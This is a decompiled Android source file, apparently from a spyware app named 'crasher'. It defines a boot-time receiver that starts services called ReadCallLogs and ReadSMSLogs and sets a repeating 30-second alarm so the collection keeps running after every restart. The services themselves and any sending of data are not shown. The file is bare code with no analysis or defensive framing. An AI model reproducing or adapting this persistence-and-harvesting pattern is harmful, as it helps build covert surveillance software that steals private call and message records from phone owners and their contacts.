package com.bigeye.crasher;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import java.util.Calendar;
/* loaded from: classes.dex */
public class ScheduleReceiver extends BroadcastReceiver {
    private static final long REPEAT_TIME = 30000;
    private final String APP_TAG = getClass().getSimpleName();

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        Log.i(this.APP_TAG, "Alright! woken up by BOOT_COMPLETED OP");
        context.startService(new Intent(context, ReadCallLogs.class));
        context.startService(new Intent(context, ReadSMSLogs.class));
        AlarmManager service = (AlarmManager) context.getSystemService("alarm");
        Intent i = new Intent(context, StartServiceReceiver.class);
        PendingIntent pending = PendingIntent.getBroadcast(context, 0, i, 268435456);
        Calendar cal = Calendar.getInstance();
        cal.add(13, 30);
        service.setInexactRepeating(0, cal.getTimeInMillis(), REPEAT_TIME, pending);
    }
}
